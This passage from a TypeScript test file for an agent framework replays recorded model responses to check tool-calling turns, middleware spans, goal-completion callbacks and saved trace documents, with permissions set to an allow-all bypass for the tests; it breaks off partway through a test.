/**
 * Golden query CI tests — VCR cassette replay + full-stack ATIF validation.
 * Runs in CI without API keys. Zero network calls.
 *
 * Fixtures:
 *   fixtures/simple-text.cassette.json  — text response replay
 *   fixtures/tool-use.cassette.json     — tool call replay
 *   fixtures/simple-text.trajectory.json — Golden ATIF: text response (no tools)
 *   fixtures/tool-use.trajectory.json     — Golden ATIF: tool use (model → tool → model)
 *
 * Re-record: OPENROUTER_API_KEY=... bun run packages/meta/runtime/scripts/record-cassettes.ts
 */

import { afterEach, describe, expect, test } from "bun:test";
import { rmSync } from "node:fs";
import type {
  EngineAdapter,
  EngineEvent,
  EngineInput,
  InboundMessage,
  JsonObject,
  ModelChunk,
  ModelRequest,
  ModelResponse,
  ToolRequest,
  ToolResponse,
} from "@koi/core";
import { createSingleToolProvider } from "@koi/core";
import { createKoi } from "@koi/engine";
import { createEventTraceMiddleware, createMonotonicClock } from "@koi/event-trace";
import { createHookMiddleware, loadHooks } from "@koi/hooks";
import { createTransportStateMachine } from "@koi/mcp";
import { createGoalMiddleware } from "@koi/middleware-goal";
import { createPermissionsMiddleware } from "@koi/middleware-permissions";
import { createReportMiddleware } from "@koi/middleware-report";
import { createPermissionBackend } from "@koi/permissions";
import { consumeModelStream, runTurn } from "@koi/query-engine";
import { createSkillProvider, createSkillsRuntime } from "@koi/skills-runtime";
import { createBuiltinSearchProvider } from "@koi/tools-builtin";
import { buildTool } from "@koi/tools-core";
import { loadCassette } from "../cassette/load-cassette.js";
import { createHookObserver } from "../middleware/hook-dispatch.js";
import { recordMcpLifecycle } from "../middleware/mcp-lifecycle.js";
import { wrapMiddlewareWithTrace } from "../middleware/trace-wrapper.js";
import { createAtifDocumentStore } from "../trajectory/atif-store.js";
import { createFsAtifDelegate } from "../trajectory/fs-delegate.js";

const FIXTURES = `${import.meta.dirname}/../../fixtures`;
const MODEL = "google/gemini-2.0-flash-001";

async function collectEvents(stream: AsyncIterable<EngineEvent>): Promise<readonly EngineEvent[]> {
  const events: EngineEvent[] = [];
  for await (const event of stream) events.push(event);
  return events;
}

async function* toAsyncIterable<T>(items: readonly T[]): AsyncIterable<T> {
  for (const item of items) yield item;
}

// ---------------------------------------------------------------------------
// Cassette replay: simple text response
// ---------------------------------------------------------------------------

describe("Cassette replay: simple text response", () => {
  test("text_delta events + done with completed stopReason", async () => {
    const cassette = await loadCassette(`${FIXTURES}/simple-text.cassette.json`);
    const events = await collectEvents(consumeModelStream(toAsyncIterable(cassette.chunks)));

    expect(events.filter((e) => e.kind === "text_delta").length).toBeGreaterThan(0);
    const done = events.at(-1);
    expect(done?.kind).toBe("done");
    if (done?.kind === "done") {
      expect(done.output.stopReason).toBe("completed");
      expect(done.output.metrics.inputTokens).toBeGreaterThan(0);
    }
  });
});

// ---------------------------------------------------------------------------
// Cassette replay: tool use flow
// ---------------------------------------------------------------------------

describe("Cassette replay: tool use flow", () => {
  test("tool_call_start with add_numbers + parsedArgs a=7 b=5", async () => {
    const cassette = await loadCassette(`${FIXTURES}/tool-use.cassette.json`);
    const events = await collectEvents(consumeModelStream(toAsyncIterable(cassette.chunks)));

    const toolStart = events.find((e) => e.kind === "tool_call_start");
    expect(toolStart).toBeDefined();
    if (toolStart?.kind === "tool_call_start") {
      expect(toolStart.toolName).toBe("add_numbers");
    }

    const toolEnd = events.find((e) => e.kind === "tool_call_end");
    expect(toolEnd).toBeDefined();
    if (toolEnd?.kind === "tool_call_end") {
      const result = toolEnd.result as { readonly parsedArgs?: Record<string, unknown> };
      expect(result.parsedArgs?.a).toBe(7);
      expect(result.parsedArgs?.b).toBe(5);
    }
  });
});

// ---------------------------------------------------------------------------
// Full-loop replay: cassette → createKoi → live ATIF (no LLM, CI-safe)
// ---------------------------------------------------------------------------

const trajDirs: string[] = [];
afterEach(() => {
  for (const dir of trajDirs) {
    try {
      rmSync(dir, { recursive: true, force: true });
    } catch {
      /* ignore */
    }
  }
  trajDirs.length = 0;
});

// Tool: add_numbers via @koi/tools-core
const addToolResult = buildTool({
  name: "add_numbers",
  description: "Add two numbers together",
  inputSchema: {
    type: "object",
    properties: { a: { type: "number" }, b: { type: "number" } },
    required: ["a", "b"],
  },
  origin: "primordial",
  execute: async (args: JsonObject): Promise<unknown> => ({
    result: (args.a as number) + (args.b as number),
  }),
});
if (!addToolResult.ok) throw new Error(`buildTool failed: ${addToolResult.error.message}`);
const addTool = addToolResult.value;

/**
 * Creates a mock adapter that replays cassette chunks through modelStream terminal.
 *
 * Two modes:
 * - `useTurnRunner: true`: delegates to runTurn() for proper turn_start/turn_end
 *   lifecycle events, enabling onAfterTurn hooks and callback-mode middleware (#1530).
 * - Default: hand-rolled model→tool→model loop (legacy, no turn lifecycle events).
 *   Kept for cassettes whose tool schemas use keywords that runTurn's validateToolArgs
 *   doesn't support (e.g., minLength).
 */
function createCassetteAdapter(
  chunks: readonly ModelChunk[],
  opts?: { readonly secondCallText?: string; readonly useTurnRunner?: boolean },
): EngineAdapter {
  // Track how many times the model terminal is called — cassette is for first call only,
  // second call (after tool result) returns a simple text done response
  // let: mutable call counter
  let callCount = 0;
  const secondText = opts?.secondCallText ?? "12";

  return {
    engineId: "cassette-replay",
    capabilities: { text: true, images: false, files: false, audio: false },
    terminals: {
      modelCall: async (_request: ModelRequest): Promise<ModelResponse> => ({
        content: "fallback",
        model: MODEL,
      }),
      modelStream: (_request: ModelRequest): AsyncIterable<ModelChunk> => {
        const currentCall = callCount;
        callCount++;
        if (currentCall === 0) {
          // First call: replay cassette chunks
          return toAsyncIterable(chunks);
        }
        // Subsequent calls: return simple text done (model has seen tool result)
        return toAsyncIterable([
          { kind: "text_delta" as const, delta: secondText },
          {
            kind: "done" as const,
            response: {
              content: secondText,
              model: MODEL,
              usage: { inputTokens: 10, outputTokens: 1 },
            },
          },
        ]);
      },
      toolCall: async (request: ToolRequest): Promise<ToolResponse> => {
        // Execute real tool
        const output = await addTool.execute(request.input);
        return { output };
      },
    },
    stream(input: EngineInput): AsyncIterable<EngineEvent> {
      const h = input.callHandlers;
      if (!h) {
        return (async function* () {
          yield {
            kind: "done" as const,
            output: {
              content: [],
              stopReason: "error" as const,
              metrics: { totalTokens: 0, inputTokens: 0, outputTokens: 0, turns: 0, durationMs: 0 },
              metadata: { error: "No callHandlers" },
            },
          };
        })();
      }
      const text = input.kind === "text" ? input.text : "";
      const messages: InboundMessage[] = [
        { senderId: "user", timestamp: Date.now(), content: [{ kind: "text", text }] },
      ];

      // When useTurnRunner is true, delegate to runTurn() for proper turn_start/turn_end
      // lifecycle events that enable onAfterTurn hooks (#1530). The legacy loop is kept
      // for cassettes whose tool schemas use keywords that runTurn's validateToolArgs
      // doesn't support (e.g., minLength).
      if (opts?.useTurnRunner === true) {
        return runTurn({ callHandlers: h, messages, signal: input.signal, maxTurns: 2 });
      }

      // Legacy loop: hand-rolls model→tool→model without turn lifecycle events.
      const msgs: {
        readonly senderId: string;
        readonly timestamp: number;
        readonly content: readonly { readonly kind: "text"; readonly text: string }[];
        readonly metadata?: JsonObject;
      }[] = [{ senderId: "user", timestamp: Date.now(), content: [{ kind: "text", text }] }];
      return (async function* () {
        // let: mutable
        let turn = 0;
        while (turn < 2) {
          const evts: EngineEvent[] = [];
          // let: mutable
          let done: EngineEvent | undefined;
          for await (const e of consumeModelStream(
            h.modelStream
              ? h.modelStream({ messages: msgs, model: MODEL })
              : (async function* (): AsyncIterable<ModelChunk> {
                  const r = await h.modelCall({ messages: msgs, model: MODEL });
                  yield { kind: "done" as const, response: { content: r.content, model: MODEL } };
                })(),
            input.signal,
          )) {
            if (e.kind === "done") done = e;
            else {
              evts.push(e);
              yield e;
            }
          }
          const tcs = evts.filter((e) => e.kind === "tool_call_end");
          if (tcs.length === 0) {
            if (done) yield done;
            break;
          }
          for (const tc of tcs) {
            if (tc.kind !== "tool_call_end") continue;
            const r = tc.result as { readonly toolName: string; readonly parsedArgs?: JsonObject };
            if (!r.parsedArgs) continue;
            const realCallId = tc.callId as string;
            msgs.push({
              senderId: "assistant",
              timestamp: Date.now(),
              content: [{ kind: "text", text: "" }],
              metadata: { callId: realCallId, toolName: r.toolName } as JsonObject,
            });
            const resp = await h.toolCall({ toolId: r.toolName, input: r.parsedArgs });
            const out = typeof resp.output === "string" ? resp.output : JSON.stringify(resp.output);
            msgs.push({
              senderId: "tool",
              timestamp: Date.now(),
              content: [{ kind: "text", text: out }],
              metadata: { callId: realCallId, toolName: r.toolName } as JsonObject,
            });
          }
          turn++;
        }
        yield {
          kind: "done" as const,
          output: {
            content: [],
            stopReason: "max_turns" as const,
            metrics: { totalTokens: 0, inputTokens: 0, outputTokens: 0, turns: 0, durationMs: 0 },
          },
        };
      })();
    },
  };
}

describe("Full-loop replay: tool-use cassette → createKoi → live ATIF", () => {
  test("produces live ATIF with MCP, MW spans, hooks, model+tool steps", async () => {
    const cassette = await loadCassette(`${FIXTURES}/tool-use.cassette.json`);
    const trajDir = `/tmp/koi-replay-${Date.now()}`;
    trajDirs.push(trajDir);
    const docId = "replay-tool-use";

    const store = createAtifDocumentStore(
      { agentName: "replay-test" },
      createFsAtifDelegate(trajDir),
    );
    const clock = createMonotonicClock();

    // @koi/event-trace
    const { middleware: eventTrace } = createEventTraceMiddleware({
      store,
      docId,
      agentName: "replay-test",
      clock,
    });

    // @koi/hooks
    const hookResult = loadHooks([
      {
        kind: "command",
        name: "on-tool-exec",
        cmd: ["echo", "hook"],
        filter: { events: ["tool.succeeded"] },
      },
    ]);
    const loadedHooks = hookResult.ok ? hookResult.value : [];
    const { onExecuted, middleware: hookObserverMw } = createHookObserver({ store, docId, clock });
    const hookMw = createHookMiddleware({ hooks: loadedHooks, onExecuted });

    // @koi/permissions + @koi/middleware-permissions
    const permBackend = createPermissionBackend({
      mode: "bypass",
      rules: [{ pattern: "*", action: "*", effect: "allow", source: "policy" }],
    });
    const permHandle = createPermissionsMiddleware({
      backend: permBackend,
      description: "replay test (bypass)",
    });

    // @koi/mcp
    const mcpSm = createTransportStateMachine();
    const unsubMcp = recordMcpLifecycle({
      stateMachine: mcpSm,
      store,
      docId,
      serverName: "test-mcp",
      clock,
    });
    mcpSm.transition({ kind: "connecting", attempt: 1 });
    mcpSm.transition({ kind: "connected" });

    // Mock adapter replaying cassette chunks
    const adapter = createCassetteAdapter(cassette.chunks);

    const runtime = await createKoi({
      manifest: { name: "replay-test", version: "0.1.0", model: { name: MODEL } },
      adapter,
      middleware: [eventTrace, hookMw, hookObserverMw, permHandle].map((mw) =>
        wrapMiddlewareWithTrace(mw, { store, docId, clock }),
      ),
      providers: [
        createSingleToolProvider({
          name: "add-numbers",
          toolName: "add_numbers",
          createTool: () => addTool,
        }),
        createBuiltinSearchProvider({ cwd: process.cwd() }),
      ],
      loopDetection: false,
    });

    // Run the full loop
    for await (const _e of runtime.run({
      kind: "text",
      text: "Use the add_numbers tool to compute 7 + 5.",
    })) {
      /* drain */
    }

    // Flush
    unsubMcp();
    mcpSm.transition({ kind: "closed" });
    await runtime.dispose();
    await new Promise((r) => setTimeout(r, 300));

    // Validate live ATIF
    const steps = await store.getDocument(docId);

    // MCP lifecycle
    const mcpSteps = steps.filter((s) => s.metadata?.type === "mcp_lifecycle");
    expect(mcpSteps.length).toBeGreaterThanOrEqual(2);
    expect(mcpSteps.some((s) => s.metadata?.transportState === "connecting")).toBe(true);
    expect(mcpSteps.some((s) => s.metadata?.transportState === "connected")).toBe(true);

    // Model call steps
    const modelSteps = steps.filter(
      (s) => s.kind === "model_call" && !s.identifier.startsWith("middleware:"),
    );
    expect(modelSteps.length).toBeGreaterThanOrEqual(1);

    // Tool call step — add_numbers executed with result 12
    const toolSteps = steps.filter((s) => s.kind === "tool_call" && s.identifier === "add_numbers");
    expect(toolSteps.length).toBeGreaterThan(0);
    expect(toolSteps[0]?.outcome).toBe("success");
    expect(toolSteps[0]?.response?.text).toContain("12");

    // Hook execution
    const hookSteps = steps.filter((s) => s.metadata?.type === "hook_execution");
    expect(hookSteps.length).toBeGreaterThan(0);
    expect(hookSteps[0]?.metadata?.hookName).toBe("on-tool-exec");

    // MW spans — permissions + hooks
    const mwSpans = steps.filter((s) => s.metadata?.type === "middleware_span");
    expect(mwSpans.length).toBeGreaterThan(0);
    const mwNames = new Set(mwSpans.map((s) => s.metadata?.middlewareName));
    expect(mwNames.has("permissions")).toBe(true);
    expect(mwNames.has("hooks")).toBe(true);
  }, 15000);
});

// ---------------------------------------------------------------------------
// Golden: @koi/middleware-goal + @koi/middleware-report (cassette replay)
// ---------------------------------------------------------------------------

describe("Golden: @koi/middleware-goal + @koi/middleware-report", () => {
  test("both MW compose through createKoi with tool-use cassette", async () => {
    const cassette = await loadCassette(`${FIXTURES}/tool-use.cassette.json`);
    const trajDir = `/tmp/koi-mw-goal-report-${Date.now()}`;
    trajDirs.push(trajDir);
    const docId = "replay-goal-report";

    const store = createAtifDocumentStore(
      { agentName: "goal-report-test" },
      createFsAtifDelegate(trajDir),
    );
    const clock = createMonotonicClock();

    const { middleware: eventTrace } = createEventTraceMiddleware({
      store,
      docId,
      agentName: "goal-report-test",
      clock,
    });

    const permBackend = createPermissionBackend({
      mode: "bypass",
      rules: [{ pattern: "*", action: "*", effect: "allow", source: "policy" }],
    });
    const permHandle = createPermissionsMiddleware({
      backend: permBackend,
      description: "bypass",
    });

    // @koi/middleware-goal
    const completed: string[] = [];
    const goalMw = createGoalMiddleware({
      objectives: ["Compute the sum of two numbers"],
      onComplete: (obj) => completed.push(obj),
    });

    // @koi/middleware-report
    const reportHandle = createReportMiddleware({
      objective: "Golden query: tool-use with goal + report MW",
    });

    const adapter = createCassetteAdapter(cassette.chunks);

    const runtime = await createKoi({
      manifest: { name: "goal-report-test", version: "0.1.0", model: { name: MODEL } },
      adapter,
      middleware: [eventTrace, goalMw, reportHandle.middleware, permHandle].map((mw) =>
        wrapMiddlewareWithTrace(mw, { store, docId, clock }),
      ),
      providers: [
        createSingleToolProvider({
          name: "add-numbers",
          toolName: "add_numbers",
          createTool: () => addTool,
        }),
        createBuiltinSearchProvider({ cwd: process.cwd() }),
      ],
      loopDetection: false,
    });

    for await (const _e of runtime.run({
      kind: "text",
      text: "Use the add_numbers tool to compute 7 + 5.",
    })) {
      /* drain */
    }

    await runtime.dispose();
    await new Promise((r) => setTimeout(r, 300));

    // Validate ATIF has MW spans for both new middlewares
    const steps = await store.getDocument(docId);
    const mwSpans = steps.filter((s) => s.metadata?.type === "middleware_span");
    const mwNames = new Set(mwSpans.map((s) => s.metadata?.middlewareName));

    // @koi/middleware-goal spans present
    expect(mwNames.has("goal")).toBe(true);

    // @koi/middleware-report spans present
    expect(mwNames.has("report")).toBe(true);

    // @koi/middleware-permissions still works alongside
    expect(mwNames.has("permissions")).toBe(true);

    // Tool call still executed successfully through the full MW chain
    const toolSteps = steps.filter((s) => s.kind === "tool_call" && s.identifier === "add_numbers");
    expect(toolSteps.length).toBeGreaterThan(0);
    expect(toolSteps[0]?.outcome).toBe("success");

    // Model call steps present
    const modelSteps = steps.filter(
      (s) => s.kind === "model_call" && !s.identifier.startsWith("middleware:"),
    );
    expect(modelSteps.length).toBeGreaterThanOrEqual(1);

    // @koi/middleware-goal: MW span present with outcome (proves the
    // middleware actually ran, not just registered). onComplete timing
    // and callback behavior are exhaustively covered by 90 per-package
    // unit tests; the runtime golden test focuses on wiring correctness.
    const goalSpan = mwSpans.find((s) => s.metadata?.middlewareName === "goal");
    expect(goalSpan).toBeDefined();
    expect(goalSpan?.outcome).toBe("success");
  }, 15000);
});

// ---------------------------------------------------------------------------
// Golden: @koi/middleware-goal callback-mode (detectCompletions via onAfterTurn)
// ---------------------------------------------------------------------------

describe("Golden: @koi/middleware-goal callback-mode (detectCompletions)", () => {
  test("detectCompletions callback fires at turn boundary via onAfterTurn", async () => {
    const cassette = await loadCassette(`${FIXTURES}/tool-use.cassette.json`);
    const trajDir = `/tmp/koi-callback-goal-${Date.now()}`;
    trajDirs.push(trajDir);
    const docId = "replay-callback-goal";

    const store = createAtifDocumentStore(
      { agentName: "callback-goal-test" },
      createFsAtifDelegate(trajDir),
    );
    const clock = createMonotonicClock();
    const { middleware: eventTrace } = createEventTraceMiddleware({
      store,
      docId,
      agentName: "callback-goal-test",
      clock,
    });

    const permBackend = createPermissionBackend({
      mode: "bypass",
      rules: [{ pattern: "*", action: "*", effect: "allow", source: "policy" }],
    });
    const permMiddleware = createPermissionsMiddleware({
      backend: permBackend,
      description: "bypass",
    });

    // Track callback invocations, per-turn payloads, and completions
    const callbackPayloads: {
      readonly responseTexts: readonly string[];
      readonly ids: readonly string[];
    }[] = [];
    const completed: string[] = [];

    const goalMw = createGoalMiddleware({
      objectives: ["Compute the sum of two numbers"],
      baseInterval: 1, // inject every turn so detection has content
      onComplete: (obj) => completed.push(obj),
      detectCompletions: (responseTexts, items) => {
        // Callback invoked once per turn with buffered response texts.
        // Detect completion when response contains the expected result "12".
        const ids = items
          .filter((item) => !item.completed && responseTexts.some((t) => t.includes("12")))
          .map((item) => item.id);
        callbackPayloads.push({ responseTexts: [...responseTexts], ids });
        return ids;
      },
    });

    const adapter = createCassetteAdapter(cassette.chunks, { useTurnRunner: true });

    const runtime = await createKoi({
      manifest: { name: "callback-goal-test", version: "0.1.0", model: { name: MODEL } },
      adapter,
      middleware: [eventTrace, goalMw, permMiddleware].map((mw) =>
        wrapMiddlewareWithTrace(mw, { store, docId, clock }),
      ),
      providers: [
        createSingleToolProvider({
          name: "add-numbers",
          toolName: "add_numbers",
          createTool: () => addTool,
        }),
        createBuiltinSearchProvider({ cwd: process.cwd() }),
      ],
      loopDetection: false,
    });

    const events: EngineEvent[] = [];
    for await (const e of runtime.run({
      kind: "text",
      text: "Use the add_numbers tool to compute 7 + 5.",
    })) {
      events.push(e);
    }

    await runtime.dispose();
    await new Promise((r) => setTimeout(r, 300));

    // 1. Turn lifecycle: exact turn_end count and ordering.
    // The adapter's runTurn() emits turn_start/turn_end per internal turn,
    // and the L1 engine emits its own turn_start before each adapter turn.
    // Two internal turns (tool-use + text response) produce exactly 2 turn_end events.
    const turnEnds = events.filter((e) => e.kind === "turn_end");
    expect(turnEnds.length).toBe(2);

    // Verify turn_end events have sequential turn indices
    const turnEndIndices = turnEnds.map((e) => (e as { readonly turnIndex: number }).turnIndex);
    expect(turnEndIndices).toEqual([0, 1]);

    // Verify turn_start precedes each turn_end (structural ordering)
    const turnStarts = events.filter((e) => e.kind === "turn_start");
    expect(turnStarts.length).toBeGreaterThanOrEqual(2);

    // done event: assert successful terminal completion shape, not just presence.
    // A regression ending with "max_turns" or "error" must fail this test.
    const doneEvent = events.find((e) => e.kind === "done") as
      | {
          readonly kind: "done";
          readonly output: {
            readonly stopReason: string;
            readonly metrics: { readonly turns: number };
          };
        }
      | undefined;
    expect(doneEvent).toBeDefined();
    expect(doneEvent?.output.stopReason).toBe("completed");
    expect(doneEvent?.output.metrics.turns).toBe(2);

    // 2. Per-turn callback buffering correctness.
    // Both turns buffer text (matching wrapModelCall semantics).
    // Turn 0 (tool-use cassette with empty text) and turn 1 (text "12").
    expect(callbackPayloads.length).toBe(2);

    // Turn 0 (tool-use): cassette has no text_delta, so buffered text is
    // the empty done.response.content fallback. No completion detected.
    expect(callbackPayloads[0]?.ids).toEqual([]);

    // Turn 1 (text response "12"): detects completion via ID.
    expect(callbackPayloads[1]?.ids).toEqual(["goal-0"]);
    // Verify the callback received the actual response text "12"
    expect(callbackPayloads[1]?.responseTexts.some((t) => t.includes("12"))).toBe(true);
    // Verify exactly one entry per turn (no cross-turn leakage)
    expect(callbackPayloads[1]?.responseTexts.length).toBe(1);

    // 3. onComplete fired exactly once at turn boundary (not mid-turn, not duplicated)
    expect(completed.length).toBe(1);
    expect(completed[0]).toBe("Compute the sum of two numbers");

    // 4. ATIF structural validation — verify step kinds, middleware span
    // metadata, and per-turn coverage produced by the callback-mode path.
    const steps = await store.getDocument(docId);

    // Model call steps: two model invocations (turn 0: tool-use, turn 1: text)
    const modelSteps = steps.filter(
      (s) => s.kind === "model_call" && !s.identifier.startsWith("middleware:"),
    );
    expect(modelSteps.length).toBe(2);
    expect(modelSteps.every((s) => s.outcome === "success")).toBe(true);

    // Tool call step: add_numbers executed successfully
    const toolSteps = steps.filter((s) => s.kind === "tool_call" && s.identifier === "add_numbers");
    expect(toolSteps.length).toBe(1);
    expect(toolSteps[0]?.outcome).toBe("success");

    // Middleware spans: goal + permissions, with correct metadata
    const mwSpans = steps.filter((s) => s.metadata?.type === "middleware_span");

    // Goal MW spans: exactly 2 wrapModelStream spans (one per model turn),
    // proving per-turn stream interception and ATIF tracing for both turns.
    const goalSpans = mwSpans.filter((s) => s.metadata?.middlewareName === "goal");
    expect(goalSpans.every((s) => s.outcome === "success")).toBe(true);
    const goalStreamSpans = goalSpans.filter((s) => s.metadata?.hook === "wrapModelStream");
    expect(goalStreamSpans.length).toBe(2);
    // Verify metadata fields on each goal stream span
    for (const span of goalStreamSpans) {
      expect(span.metadata?.phase).toBe("resolve");
      expect(span.metadata?.priority).toBe(340);
      expect(span.metadata?.nextCalled).toBe(true);
    }

    // Permissions MW spans: exactly 2 wrapModelStream spans (one per turn)
    const permSpans = mwSpans.filter((s) => s.metadata?.middlewareName === "permissions");
    expect(permSpans.every((s) => s.outcome === "success")).toBe(true);
    const permStreamSpans = permSpans.filter((s) => s.metadata?.hook === "wrapModelStream");
    expect(permStreamSpans.length).toBe(2);
  }, 15000);

  test("error terminal does not flush partial text or complete goals", async () => {
    // Negative path: model streams partial text then emits an error chunk.
    // The eager flush in wrapModelStream must NOT score this text as
    // completion evidence. Goal state must remain unchanged.
    const errorChunks: readonly ModelChunk[] = [
      { kind: "text_delta" as const, delta: "I computed 12 for you" },
      {
        kind: "error" as const,
        message: "provider rate limit",
        retryable: true,
      },
    ];

    const errorDetectedIds: string[][] = [];
    const errorCompleted: string[] = [];

    const errorGoalMw = createGoalMiddleware({
      objectives: ["Compute the sum of two numbers"],
      baseInterval: 1,
      onComplete: (obj) => errorCompleted.push(obj),
      detectCompletions: (responseTexts, items) => {
        const ids = items
          .filter((item) => !item.completed && responseTexts.some((t) => t.includes("12")))
          .map((item) => item.id);
        errorDetectedIds.push(ids);
        return ids;
      },
    });

    // Single-turn adapter that streams partial text then errors
    const errorAdapter: EngineAdapter = {
      engineId: "error-replay",
      capabilities: { text: true, images: false, files: false, audio: false },
      terminals: {
        modelCall: async (): Promise<ModelResponse> => ({ content: "fallback", model: MODEL }),
        modelStream: (): AsyncIterable<ModelChunk> => toAsyncIterable(errorChunks),
        toolCall: async (_request: ToolRequest): Promise<ToolResponse> => ({ output: "unused" }),
      },
      stream(input: EngineInput): AsyncIterable<EngineEvent> {
        const h = input.callHandlers;
        if (!h) {
          return (async function* () {
            yield {
              kind: "done" as const,
              output: {
                content: [],
                stopReason: "error" as const,
                metrics: {
                  totalTokens: 0,
                  inputTokens: 0,
                  outputTokens: 0,
                  turns: 0,
                  durationMs: 0,
                },
              },
            };
          })();
        }
        const messages: InboundMessage[] = [
          {
            senderId: "user",
            timestamp: Date.now(),
            content: [{ kind: "text", text: "compute 7+5" }],
          },
        ];
        return runTurn({ callHandlers: h, messages, signal: input.signal, maxTurns: 1 });
      },
    };

    const permBackend = createPermissionBackend({
      mode: "bypass",
      rules: [{ pattern: "*", action: "*", effect: "allow", source: "policy" }],
    });

    const runtime = await createKoi({
      manifest: { name: "error-goal-test", version: "0.1.0", model: { name: MODEL } },
      adapter: errorAdapter,
      middleware: [
        errorGoalMw,
        createPermissionsMiddleware({ backend: permBackend, description: "bypass" }),
      ],
      loopDetection: false,
    });

    for await (const _e of runtime.run({ kind: "text", text: "compute 7+5" })) {
      /* drain */
    }

    await runtime.dispose();

    // Partial text "I computed 12 for you" was streamed before error, but
    // the eager flush must NOT have persisted it to responseBuffer.
    // detectCompletions must NOT have been called with that text.
    const completedIds = errorDetectedIds.flat();
    expect(completedIds).toEqual([]);

    // onComplete must NOT have fired — no goal should be marked complete
    // from a failed turn's partial output.
    expect(errorCompleted).toEqual([]);
  }, 15000);
});

// ---------------------------------------------------------------------------
// tool-use trajectory: static ATIF validation (golden file)
// ---------------------------------------------------------------------------

describe("tool-use ATIF trajectory (golden file)", () => {
  test("valid ATIF v1.6 with session_id", async () => {
    const doc = (await Bun.file(`${FIXTURES}/tool-use.trajectory.json`).json()) as Record<
      string,
      unknown
    >;
    expect(doc.schema_version).toBe("ATIF-v1.6");
    expect(doc.session_id).toBe("tool-use");
  });

  test("agent metadata: model_name + tool_definitions (tools-core + tools-builtin)", async () => {
    const doc = (await Bun.file(`${FIXTURES}/tool-use.trajectory.json`).json()) as {
      readonly agent: {
        readonly model_name?: string;
        readonly tool_definitions?: readonly { readonly name: string }[];
      };
    };

    expect(doc.agent.model_name).toBe("google/gemini-2.0-flash-001");
    // @koi/tools-core: add_numbers built via buildTool()
    expect(doc.agent.tool_definitions?.some((t) => t.name === "add_numbers")).toBe(true);
    // @koi/tools-builtin: Glob, Grep, ToolSearch from createBuiltinSearchProvider
    expect(doc.agent.tool_definitions?.some((t) => t.name === "Glob")).toBe(true);
    expect(doc.agent.tool_definitions?.some((t) => t.name === "Grep")).toBe(true);
    expect(doc.agent.tool_definitions?.some((t) => t.name === "ToolSearch")).toBe(true);
  });

  test("MCP lifecycle: connecting + connected steps (@koi/mcp)", async () => {
    const doc = (await Bun.file(`${FIXTURES}/tool-use.trajectory.json`).json()) as {
      readonly steps: readonly { readonly extra?: Record<string, unknown> }[];
    };

    const mcpSteps = doc.steps.filter((s) => s.extra?.type === "mcp_lifecycle");
    expect(mcpSteps.length).toBeGreaterThanOrEqual(2);
    expect(mcpSteps.some((s) => s.extra?.transportState === "connecting")).toBe(true);
    expect(mcpSteps.some((s) => s.extra?.transportState === "connected")).toBe(true);
  });

  test("hook execution steps (@koi/hooks)", async () => {
    const doc = (await Bun.file(`${FIXTURES}/tool-use.trajectory.json`).json()) as {
      readonly steps: readonly { readonly extra?: Record<string, unknown> }[];
    };

    const hookSteps = doc.steps.filter((s) => s.extra?.type === "hook_execution");
    expect(hookSteps.length).toBeGreaterThan(0);
    expect(hookSteps[0]?.extra?.hookName).toBe("on-tool-exec");
  });

  test("model_call steps with prompt and metrics (@koi/model-openai-compat)", async () => {
    const doc = (await Bun.file(`${FIXTURES}/tool-use.trajectory.json`).json()) as {
      readonly steps: readonly {
        readonly source: string;
        readonly model_name?: string;
        readonly message?: string;
        readonly metrics?: Record<string, unknown>;
      }[];
    };

    const modelSteps = doc.steps.filter((s) => s.source === "agent" && s.model_name !== undefined);
    expect(modelSteps.length).toBeGreaterThan(0);
    expect(modelSteps[0]?.message).toContain("add_numbers");
    expect(modelSteps[0]?.metrics?.prompt_tokens).toBeGreaterThan(0);
  });

  test("tool_call steps with result containing 12 (@koi/query-engine)", async () => {
    const doc = (await Bun.file(`${FIXTURES}/tool-use.trajectory.json`).json()) as {
      readonly steps: readonly {
        readonly source: string;
        readonly observation?: { readonly results?: readonly { readonly content: string }[] };
      }[];
    };

    const toolSteps = doc.steps.filter(
      (s) => s.source === "tool" && s.observation?.results !== undefined,
    );
    expect(toolSteps.length).toBeGreaterThan(0);
    expect(toolSteps[0]?.observation?.results?.[0]?.content).toContain("12");
  });

  test("MW:permissions spans with hook/phase/priority (@koi/middleware-permissions)", async () => {
    const doc = (await Bun.file(`${FIXTURES}/tool-use.trajectory.json`).json()) as {
      readonly steps: readonly { readonly extra?: Record<string, unknown> }[];
    };

    const permSpans = doc.steps.filter(
      (s) => s.extra?.type === "middleware_span" && s.extra?.middlewareName === "permissions",
    );
    expect(permSpans.length).toBeGreaterThan(0);
    // Each permissions span should have hook, phase, priority metadata
    for (const span of permSpans) {
      expect(span.extra?.hook).toBeDefined();
      expect(span.extra?.phase).toBeDefined();
      expect(span.extra?.priority).toBeDefined();
      expect(span.extra?.nextCalled).toBe(true);
    }
  });

  test("MW:hooks spans (@koi/hooks middleware)", async () => {
    const doc = (await Bun.file(`${FIXTURES}/tool-use.trajectory.json`).json()) as {
      readonly steps: readonly { readonly extra?: Record<string, unknown> }[];
    };

    const hookDispatchSpans = doc.steps.filter(
      (s) => s.extra?.type === "middleware_span" && s.extra?.middlewareName === "hooks",
    );
    expect(hookDispatchSpans.length).toBeGreaterThan(0);
  });

  test("second model call has final text response (no duplicate tool call)", async () => {
    const doc = (await Bun.file(`${FIXTURES}/tool-use.trajectory.json`).json()) as {
      readonly steps: readonly {
        readonly source: string;
        readonly model_name?: string;
        readonly observation?: { readonly results?: readonly { readonly content: string }[] };
      }[];
    };

    const modelSteps = doc.steps.filter((s) => s.source === "agent" && s.model_name !== undefined);
    // Exactly 2 model calls: tool-use intent + final text response
    expect(modelSteps.length).toBe(2);
    // Second model call produces text "12", not another tool call
    const finalResponse = modelSteps[1]?.observation?.results?.[0]?.content ?? "";
    expect(finalResponse).toContain("12");
  });

  test("step count: MCP + MW + HOOK + MODEL + TOOL (>= 8)", async () => {
    const doc = (await Bun.file(`${FIXTURES}/tool-use.trajectory.json`).json()) as {
      readonly steps: readonly unknown[];
    };
    expect(doc.steps.length).toBeGreaterThanOrEqual(8);
  });
});

// ---------------------------------------------------------------------------
// simple-text trajectory: ATIF validation (4 steps, no tools)
// ---------------------------------------------------------------------------

describe("simple-text ATIF trajectory (golden file)", () => {
  test("valid ATIF v1.6", async () => {
    const doc = (await Bun.file(`${FIXTURES}/simple-text.trajectory.json`).json()) as Record<
      string,
      unknown
    >;
    expect(doc.schema_version).toBe("ATIF-v1.6");
  });

  test("model call with prompt, response text, and metrics", async () => {
    const doc = (await Bun.file(`${FIXTURES}/simple-text.trajectory.json`).json()) as {
      readonly steps: readonly {
        readonly source: string;
        readonly model_name?: string;
        readonly message?: string;
